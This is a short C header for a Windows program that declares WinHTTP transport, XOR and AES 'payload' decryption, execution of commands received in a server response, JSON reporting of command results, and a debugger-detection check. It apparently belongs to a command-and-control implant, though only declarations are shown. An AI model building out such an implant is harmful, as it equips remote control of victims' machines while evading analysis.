#ifndef _BASE_H
#define _BASE_H

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include "command.h"
#include "transport_winhttp.h"
#include "cJSON.h"

extern char * jsonData;

wchar_t * convertCharArrayToLPCWSTR( char * charArray );
void XORDecrypt( char * data, size_t data_len, char * key, size_t key_len );
int AESDecrypt( char * payload, DWORD payload_len, char * key, size_t keylen );
void exec_command( LPSTR response );
char * commandResultJSON( const char * command, const char * result );
BOOL isDebugged( );

#endif // _BASE_H